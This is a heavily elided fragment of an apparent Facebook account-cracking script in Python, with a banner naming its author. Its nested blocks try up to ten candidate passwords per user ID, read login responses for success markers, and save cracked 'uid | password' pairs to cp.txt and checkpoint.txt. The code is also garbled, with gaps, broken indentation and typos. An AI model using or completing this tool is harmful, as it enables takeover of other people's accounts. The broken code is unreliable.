...
\033[1;97m ║║║║══╣║╠╣║╔║║╗║╗╣
\033[1;98m ╚═╝╚══╝╚╝╚╝╚══╝╚╩╝
\033[1;93m(!)\033[1;97m Author   : Uzair khan
\033[1;93m(!)\033[1;97m Github   : https://github.com/uzairkhan
\033[1;93m(!)\033[1;97m Fb Page  : https://m.facebook.com/uzairkhan
		...
		try:
			...
			if "loc" in q:
				...
				if "www.facebook.com" in q["error"]:
					print("\033[1;91m[]successful "+uid+" | "+pass1)
					cp = open("cp.txt","a")
					cp.write(uid+" | "+pass1+"\n")
					cp.close()
					...
					if "loc" in q:
						...
						if "www.facebook.com" in q["error"]:
							...
							if "loc" in q:
								...
								if "www.facebook.com" in q["error"]:
									print("\033[1;91m[successful] "+uid+" | "+pass3)
									cp = open("cp.txt","a")
									cp.write(uid+" | "+pass3+"\n")
									cp.close()
									...
									if "loc" in q:
										...
										if "www.facebook.com" in q["error"]:
											...
											if "loc" in q:
												...
												if "www.facebook.com" in q["error"]:
													print("\033[1;91m[successful] "+uid+" | "+pass5)
													cp = open("cp.txt","a")
													cp.write(uid+" | "+pass5+"\n")
													cp.close()
													...
													if "loc" in q:
														...
														if "www.facebook.com" in q["error"]:
															print("\033[1;91m[successful] "+uid+" | "+pass6)
															cp = open("cp.txt","a")
															cp.write(uid+" | "+pass6+"\n")
															cp.close()
															...
															if "loc" in q:
																...
																if "www.facebook.com" in q["error"]:
																	print("\033[1;91m[successful] "+uid+" | "+pass7)
																	cp = open("cp.txt","a")
																	cp.write(uid+" | "+pass7+"\n")
																	cp.close()
																	cps.append(uid+pass7)
															                ...
															                if "loc" in q:
																                ...
																                if "www.facebook.com" in q["error"]:
																	                print("\033[1;91m[successful] "+uid+" | "+pass8)
																	                cp = open("cp.txt","a")
																	                cp.write(uid+" | "+pass8+"\n")
																	                cp.close()
																	                cps.append(uid+pass8)
															                                ...
															                                if "loc" in q:
																                                ...
																                                if "www.facebook.com" in q["error"]:
																	                                print("\033[1;91m[successful] "+uid+" | "+pass9)
																	                                cp = open("cp.txt","a")
																	                                cp.write(uid+" | "+pass9+"\n")
																	                                cp.close()
																	                                cps.append(uid+pass9)
															                                                ...
															                                                if "loc" in q:
																                                                ...
																                                                if "www.facebook.com" in q["error"]:
																	                                                print("\033[1;91m[successful] "+uid+" | "+pass10)
																	                                                cp = open("cp.txt","a")
																	                                                cp.write(uid+" | "+pass10+"\n")
																	                                                cp.close()
	...
	def main(arg):
		...
		try:
			...
			if "loc" in q:
				...
				if "www.facebook.com" in q["error"]:
					print("\033[1;91m[successful] "+uid+" | "+pass1+"\033[0;97m")
					...
					if "loc" in q:
						...
						if "www.facebook.com" in q["error"]:
							print("\033[1;91m[successful] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("checkpoint.txt","a")
							cp.write(uid+" | "+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
							...
							if "loc" in q:
								...
								if "www.facebook.com" in q["error"]:
									print("\033[1;91m[succesful] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("checkpoint.txt","a")
									cp.write(uid+" | "+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
									...
									if "loc" in q:
										...
										if "www.facebook.com" in q["error"]:
											print(" \033[1;91m[successful] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("checkpoint.txt","a")
											cp.write(uid+" | "+pass4+"\n")
											cp.close()
											cps.apppend(uid+pass4)
									                ...
									                if "loc" in q:
										                ...
										                if "www.facebook.com" in q["error"]:
											                print(" \033[1;91m[successful] "+uid+" | "+pass5+"\033[0;97m")
											                cp = open("checkpoint.txt","a")
											                cp.write(uid+" | "+pass5+"\n")
											                cp.close()
